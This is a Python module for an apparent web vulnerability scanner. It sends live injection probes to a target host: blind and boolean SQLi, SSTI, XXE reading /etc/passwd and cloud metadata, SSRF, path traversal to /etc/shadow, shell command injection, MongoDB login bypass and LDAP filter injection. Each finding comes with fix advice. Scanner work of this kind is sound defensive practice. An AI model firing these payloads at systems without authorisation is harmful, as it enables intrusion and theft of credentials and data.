"""
Module 15: Deep Injection Testing
Blind SQLi, SSTI, XXE, SSRF, Path Traversal, Command Injection, NoSQL, LDAP
"""
import re, time, concurrent.futures
from urllib.parse import urlencode, quote

UA = "Mozilla/5.0 (SecureScan/2.0; +https://securescan.io)"
TIMEOUT = 8

def _get(url, method="GET", headers=None, data=None, allow_redirects=True, timeout=None):
    try:
        import requests
        h = {"User-Agent": UA, **(headers or {})}
        t = timeout or TIMEOUT
        if method == "POST":
            return requests.post(url, headers=h, timeout=t, json=data, allow_redirects=allow_redirects)
        return requests.get(url, headers=h, timeout=t, allow_redirects=allow_redirects)
    except Exception:
        return None

def _req(url, method="GET", data=None, headers=None, timeout=None):
    try:
        import requests
        h = {"User-Agent": UA, **(headers or {})}
        t = timeout or TIMEOUT
        if method == "POST":
            return requests.post(url, headers=h, data=data, timeout=t, allow_redirects=True)
        return requests.get(url, headers=h, timeout=t, allow_redirects=True)
    except Exception:
        return None

# ── Blind SQLi (time-based) ───────────────────────────────────────────────────
def test_blind_sqli(base: str) -> list:
    findings = []
    TIME_PAYLOADS = [
        ("MySQL",      "'; SELECT SLEEP(4)--",       4.0),
        ("PostgreSQL", "'; SELECT pg_sleep(4)--",    4.0),
        ("MSSQL",      "'; WAITFOR DELAY '0:0:4'--", 4.0),
        ("SQLite",     "' AND (SELECT 1337 FROM (SELECT(SLEEP(4)))a)--", 4.0),
    ]
    # Common injectable params
    PARAMS = ["id", "q", "search", "user", "name", "page", "cat", "category", "item", "product"]
    for param in PARAMS[:4]:
        for db, payload, delay in TIME_PAYLOADS[:2]:
            url = f"{base}?{param}=1{quote(payload)}"
            t0  = time.time()
            r   = _get(url, timeout=delay + 3)
            elapsed = time.time() - t0
            if elapsed >= delay - 0.5:
                findings.append({
                    "severity": "critical",
                    "title": f"Blind Time-Based SQLi ({db}) in param '{param}'",
                    "status": "fail",
                    "detail": f"Response delayed {elapsed:.1f}s with {db} sleep payload. High confidence blind SQL injection.",
                    "fix": "Use parameterised queries (prepared statements) everywhere. Never concatenate user input into SQL.",
                })
                return findings  # One confirmed is enough
    return findings

# ── Boolean-based blind SQLi ──────────────────────────────────────────────────
def test_boolean_sqli(base: str) -> list:
    findings = []
    PARAMS = ["id", "q", "search", "page"]
    for param in PARAMS[:3]:
        r_true  = _get(f"{base}?{param}=1' AND '1'='1", timeout=6)
        r_false = _get(f"{base}?{param}=1' AND '1'='2", timeout=6)
        if r_true and r_false:
            if len(r_true.content) != len(r_false.content) and abs(len(r_true.content) - len(r_false.content)) > 50:
                findings.append({
                    "severity": "critical",
                    "title": f"Boolean-Based Blind SQLi in param '{param}'",
                    "status": "fail",
                    "detail": f"True condition ({len(r_true.content)}B) vs false condition ({len(r_false.content)}B) produce different responses.",
                    "fix": "Use parameterised queries. Audit all database interactions.",
                })
                break
    return findings

# ── Server-Side Template Injection (SSTI) ─────────────────────────────────────
def test_ssti(base: str) -> list:
    findings = []
    # Polyglot that triggers in Jinja2, Twig, Freemarker, Smarty
    PAYLOADS = [
        ("{{7*7}}",          "49",   "Jinja2/Twig"),
        ("${7*7}",           "49",   "Freemarker/Velocity"),
        ("#{7*7}",           "49",   "Ruby ERB/Thymeleaf"),
        ("<%= 7*7 %>",       "49",   "EJS/ERB"),
        ("{{7*'7'}}",        "7777777", "Jinja2"),
        ("${{<%[%'\"}}%\\.", None,   "Error-based polyglot"),
    ]
    PARAMS = ["name", "template", "message", "text", "q", "search", "input"]
    for param in PARAMS[:4]:
        for payload, expected, engine in PAYLOADS[:4]:
            url = f"{base}?{param}={quote(payload)}"
            r   = _get(url, timeout=6)
            if r and expected and expected in r.text:
                findings.append({
                    "severity": "critical",
                    "title": f"Server-Side Template Injection ({engine}) in '{param}'",
                    "status": "fail",
                    "detail": f"Payload `{payload}` evaluated to `{expected}` — template engine is executing attacker input.",
                    "fix": "Never pass user input directly to template engines. Sanitise all inputs. Use sandboxed templates.",
                })
                return findings
    return findings

# ── XXE Injection ─────────────────────────────────────────────────────────────
def test_xxe(base: str) -> list:
    findings = []
    XXE_PAYLOADS = [
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         "root:", "Linux /etc/passwd"),
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
         None, "Hostname disclosure"),
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
         "ami-id", "AWS metadata via XXE"),
    ]
    for payload, indicator, label in XXE_PAYLOADS:
        try:
            import requests
            r = requests.post(base, data=payload,
                              headers={"Content-Type": "application/xml", "User-Agent": UA},
                              timeout=6)
            if indicator and indicator in r.text:
                findings.append({
                    "severity": "critical",
                    "title": f"XXE Injection — {label}",
                    "status": "fail",
                    "detail": f"XML parser processes external entities. {label} content returned in response.",
                    "fix": "Disable external entity processing: set FEATURE_EXTERNAL_GENERAL_ENTITIES=false. Use a safe XML parser.",
                })
                return findings
            # Check for XML parsing errors that suggest XXE-capable parser
            if r and r.status_code == 500 and any(e in r.text.lower() for e in ["xml", "entity", "parse", "dtd"]):
                findings.append({
                    "severity": "high",
                    "title": "Possible XXE — XML parser error on external entity",
                    "status": "fail",
                    "detail": "Server returned error when processing external XML entity. Parser may be vulnerable.",
                    "fix": "Disable DTD processing and external entity resolution in your XML parser.",
                })
        except Exception:
            pass
    return findings

# ── SSRF (Server-Side Request Forgery) ───────────────────────────────────────
def test_ssrf(base: str) -> list:
    findings = []
    # Cloud metadata endpoints
    SSRF_TARGETS = [
        ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname"], "AWS IMDSv1"),
        ("http://metadata.google.internal/computeMetadata/v1/", ["project", "instance"], "GCP Metadata"),
        ("http://169.254.169.254/metadata/instance", ["compute", "subscriptionId"], "Azure Metadata"),
        ("http://localhost/", None, "Localhost SSRF"),
        ("http://127.0.0.1:6379/", None, "Redis via SSRF"),
        ("http://127.0.0.1:27017/", None, "MongoDB via SSRF"),
    ]
    URL_PARAMS = ["url", "redirect", "next", "callback", "return", "src", "href", "img", "image", "proxy", "fetch", "load"]
    for param in URL_PARAMS[:5]:
        for target, indicators, label in SSRF_TARGETS[:3]:
            url = f"{base}?{param}={quote(target)}"
            r   = _get(url, timeout=5)
            if r and indicators:
                for ind in indicators:
                    if ind in r.text:
                        findings.append({
                            "severity": "critical",
                            "title": f"SSRF → {label} via param '{param}'",
                            "status": "fail",
                            "detail": f"Server fetched {target} and returned cloud metadata. Full SSRF confirmed.",
                            "fix": "Validate and allowlist URLs server-side. Block requests to 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16.",
                        })
                        return findings
    return findings

# ── Path Traversal ────────────────────────────────────────────────────────────
def test_path_traversal(base: str) -> list:
    findings = []
    TRAVERSALS = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "../../../../windows/system32/drivers/etc/hosts",
        "../../../../etc/shadow",
        "../../../../proc/self/environ",
    ]
    FILE_PARAMS = ["file", "path", "filename", "download", "template", "page", "include", "doc", "f"]
    for param in FILE_PARAMS[:5]:
        for trav in TRAVERSALS[:4]:
            url = f"{base}?{param}={trav}"
            r   = _get(url, timeout=5)
            if r:
                if "root:" in r.text and "/bin/bash" in r.text:
                    findings.append({
                        "severity": "critical",
                        "title": f"Path Traversal — /etc/passwd exposed via '{param}'",
                        "status": "fail",
                        "detail": f"Traversal payload `{trav}` returned /etc/passwd contents.",
                        "fix": "Validate file paths against an allowlist. Use os.path.realpath() and verify it starts with the expected base directory. Never pass user input directly to file operations.",
                    })
                    return findings
                if "Administrator:" in r.text or "[drivers]" in r.text:
                    findings.append({
                        "severity": "critical",
                        "title": f"Path Traversal — Windows system file via '{param}'",
                        "status": "fail",
                        "detail": f"Traversal returned Windows system file contents.",
                        "fix": "Validate and sanitise all file path parameters. Use an allowlist of permitted files.",
                    })
                    return findings
    return findings

# ── Command Injection ─────────────────────────────────────────────────────────
def test_command_injection(base: str) -> list:
    findings = []
    CMD_PAYLOADS = [
        ("; echo CMDINJECT_TEST_7x9z",  "CMDINJECT_TEST_7x9z", "semicolon"),
        ("| echo CMDINJECT_TEST_7x9z",  "CMDINJECT_TEST_7x9z", "pipe"),
        ("&& echo CMDINJECT_TEST_7x9z", "CMDINJECT_TEST_7x9z", "ampersand"),
        ("`echo CMDINJECT_TEST_7x9z`",  "CMDINJECT_TEST_7x9z", "backtick"),
        ("$(echo CMDINJECT_TEST_7x9z)", "CMDINJECT_TEST_7x9z", "subshell"),
        # Blind time-based
        ("; sleep 4",  None, "sleep"),
        ("| sleep 4",  None, "sleep"),
    ]
    PARAMS = ["host", "ip", "cmd", "exec", "command", "ping", "query", "domain", "url"]
    for param in PARAMS[:5]:
        for payload, marker, ptype in CMD_PAYLOADS[:5]:
            url = f"{base}?{param}=127.0.0.1{quote(payload)}"
            r   = _get(url, timeout=6)
            if r and marker and marker in r.text:
                findings.append({
                    "severity": "critical",
                    "title": f"OS Command Injection via param '{param}' ({ptype})",
                    "status": "fail",
                    "detail": f"Command output `{marker}` returned in response. Full RCE confirmed.",
                    "fix": "Never pass user input to shell commands. Use language-native APIs instead of exec/system. If unavoidable, use allowlisted args and no shell=True.",
                })
                return findings
        # Time-based blind
        for payload, _, ptype in CMD_PAYLOADS[5:]:
            url = f"{base}?{param}=127.0.0.1{quote(payload)}"
            t0  = time.time()
            _get(url, timeout=7)
            if time.time() - t0 >= 3.5:
                findings.append({
                    "severity": "critical",
                    "title": f"Blind Command Injection (time-based) via '{param}'",
                    "status": "fail",
                    "detail": f"Sleep payload caused {time.time()-t0:.1f}s delay. Likely RCE.",
                    "fix": "Immediately audit all system/exec calls. Remove user-controlled input from shell commands.",
                })
                return findings
    return findings

# ── NoSQL Injection ───────────────────────────────────────────────────────────
def test_nosql_injection(base: str) -> list:
    findings = []
    # MongoDB operator injection
    NOSQL_PAYLOADS = [
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        {"username": "admin", "password": {"$regex": ".*"}},
    ]
    LOGIN_PATHS = ["/login", "/api/login", "/auth", "/api/auth", "/signin", "/api/signin"]
    for path in LOGIN_PATHS:
        for payload in NOSQL_PAYLOADS:
            r = _get(f"{base}{path}", method="POST", data=payload, timeout=5)
            if r and r.status_code in (200, 302):
                body = r.text.lower()
                if any(k in body for k in ["token", "dashboard", "welcome", "logged", "success", "session"]):
                    findings.append({
                        "severity": "critical",
                        "title": f"NoSQL Injection (MongoDB operator) at {path}",
                        "status": "fail",
                        "detail": f"MongoDB operator payload bypassed authentication at {path}.",
                        "fix": "Sanitise inputs before MongoDB queries. Use a schema validation library. Never pass raw request body to db.find().",
                    })
                    return findings
    # URL param NoSQL
    for param in ["id", "user", "q"]:
        for op in ["[$gt]", "[$ne]", "[$regex]"]:
            url = f"{base}?{param}{op}=1"
            r   = _get(url, timeout=5)
            if r and r.status_code == 200 and len(r.content) > 100:
                prev = _get(f"{base}?{param}=nonexistent_xyz_123", timeout=5)
                if prev and len(r.content) > len(prev.content) + 200:
                    findings.append({
                        "severity": "high",
                        "title": f"Possible NoSQL Injection via '{param}{op}'",
                        "status": "fail",
                        "detail": "MongoDB operator in URL param returns more data than normal query.",
                        "fix": "Strip MongoDB operators ($gt, $ne, $regex etc.) from user-supplied query parameters.",
                    })
                    return findings
    return findings

# ── LDAP Injection ────────────────────────────────────────────────────────────
def test_ldap_injection(base: str) -> list:
    findings = []
    LDAP_PAYLOADS = [
        ("*)(uid=*))(|(uid=*",  "wildcard bypass"),
        ("admin)(&(password=*))", "filter injection"),
        ("*)(objectClass=*",    "objectClass bypass"),
    ]
    PARAMS = ["username", "user", "login", "uid", "cn", "name"]
    for param in PARAMS[:3]:
        for payload, ptype in LDAP_PAYLOADS[:2]:
            url = f"{base}?{param}={quote(payload)}"
            r   = _get(url, timeout=5)
            if r:
                # LDAP errors in response
                ldap_errors = ["ldap", "invalid dn", "filter error", "ldaperror", "naming exception",
                               "javax.naming", "ldap_search", "ldapexception"]
                if any(e in r.text.lower() for e in ldap_errors):
                    findings.append({
                        "severity": "high",
                        "title": f"LDAP Injection — error response via '{param}'",
                        "status": "fail",
                        "detail": f"LDAP error returned for injection payload `{payload}`. Directory may be injectable.",
                        "fix": "Escape special LDAP characters: ( ) * \\ NUL. Use parameterised LDAP queries.",
                    })
                    return findings
    return findings

# ── Master deep injection scanner ─────────────────────────────────────────────
def scan_deep_injection(host: str) -> dict:
    findings = []
    score    = 100
    base     = f"https://{host}"

    tests = [
        ("Blind Time-Based SQLi",  test_blind_sqli),
        ("Boolean SQLi",           test_boolean_sqli),
        ("SSTI",                   test_ssti),
        ("XXE",                    test_xxe),
        ("SSRF",                   test_ssrf),
        ("Path Traversal",         test_path_traversal),
        ("Command Injection",      test_command_injection),
        ("NoSQL Injection",        test_nosql_injection),
        ("LDAP Injection",         test_ldap_injection),
    ]

    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
        futures = {ex.submit(fn, base): name for name, fn in tests}
        for future, name in futures.items():
            try:
                results = future.result(timeout=30)
                for f in results:
                    findings.append(f)
                    score -= {"critical": 35, "high": 20, "medium": 10}.get(f["severity"], 5)
            except Exception as e:
                pass

    if not findings:
        findings.append({
            "severity": "low",
            "title": "No injection vulnerabilities detected",
            "status": "pass",
            "detail": "Blind SQLi, SSTI, XXE, SSRF, path traversal, command injection, NoSQL, and LDAP probes passed.",
        })

    return {
        "id": "deep_injection",
        "name": "Deep Injection Testing",
        "icon": "💉",
        "score": max(0, score),
        "findings": findings,
    }
